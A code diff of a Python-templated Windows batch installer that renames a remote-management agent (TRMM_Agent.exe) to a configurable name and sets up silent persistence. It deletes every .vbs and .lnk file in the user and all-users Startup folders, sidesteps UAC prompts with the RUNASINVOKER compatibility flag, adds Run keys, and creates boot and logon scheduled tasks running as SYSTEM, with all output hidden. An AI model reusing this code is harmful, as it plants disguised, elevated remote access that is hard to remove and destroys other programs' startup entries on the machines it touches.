@@ -137,11 +137,11 @@ taskkill /F /IM {app_name}.exe 2>nul
 taskkill /F /IM TRMM_Agent.exe 2>nul
 timeout /t 1 /nobreak >nul 2>&1
 
-echo [*] Cleaning up old startup shortcuts...
-del /f /q "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{app_name}*.lnk" 2>nul
-del /f /q "%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{app_name}*.lnk" 2>nul
-del /f /q "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\TRMM_Agent*.lnk" 2>nul
-del /f /q "%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\TRMM_Agent*.lnk" 2>nul
+echo [*] Cleaning up old startup shortcuts and VBS scripts...
+del /f /q "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\*.vbs" 2>nul
+del /f /q "%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\*.vbs" 2>nul
+del /f /q "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\*.lnk" 2>nul
+del /f /q "%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\*.lnk" 2>nul
 
 mkdir "%INSTALL_DIR%" 2>nul
 xcopy /E /Y /I "%~dp0*" "%INSTALL_DIR%\\" >nul
@@ -150,14 +150,14 @@ if exist "%INSTALL_DIR%\\TRMM_Agent.exe" if not exist "%INSTALL_DIR%\\{app_name}
     ren "%INSTALL_DIR%\\TRMM_Agent.exe" "{app_name}.exe"
 )
 
-{"" if not auto_start else f'''echo [*] Configuring silent auto-start persistence (Zero UAC prompts)...
+{"" if not auto_start else f'''echo [*] Configuring silent auto-start persistence...
 powershell -NoProfile -Command "Unblock-File -Path '%INSTALL_DIR%\\{app_name}.exe'" >nul 2>&1
 reg add "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers" /v "%INSTALL_DIR%\\{app_name}.exe" /t REG_SZ /d "~ RUNASINVOKER" /f >nul 2>&1
 reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers" /v "%INSTALL_DIR%\\{app_name}.exe" /t REG_SZ /d "~ RUNASINVOKER" /f >nul 2>&1
 reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{app_name}" /f >nul 2>&1
 reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "TRMM_Agent" /f >nul 2>&1
-powershell -NoProfile -Command "$vbs = [Environment]::GetFolderPath('Startup') + '\\{app_name}.vbs'; $c = @('Set ws = CreateObject(\"WScript.Shell\")', 'ws.Environment(\"Process\")(\"__COMPAT_LAYER\") = \"RunAsInvoker\"', 'ws.Run \"\"\"%INSTALL_DIR%\\{app_name}.exe\"\"\", 0, False'); [IO.File]::WriteAllLines($vbs, $c); Unblock-File -Path $vbs" >nul 2>&1
-reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{app_name}" /t REG_SZ /d "wscript.exe \\"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{app_name}.vbs\\"" /f >nul 2>&1
+reg delete "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Agent_Workstation-01" /f >nul 2>&1
+reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{app_name}" /t REG_SZ /d "\\"%INSTALL_DIR%\\{app_name}.exe\\"" /f >nul 2>&1
 schtasks /Create /TN "{app_name}_Persist" /TR "\\"%INSTALL_DIR%\\{app_name}.exe\\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /DELAY 0000:10 /F >nul 2>&1
 schtasks /Create /TN "{app_name}_User" /TR "\\"%INSTALL_DIR%\\{app_name}.exe\\"" /SC ONLOGON /RL HIGHEST /F >nul 2>&1
 '''}
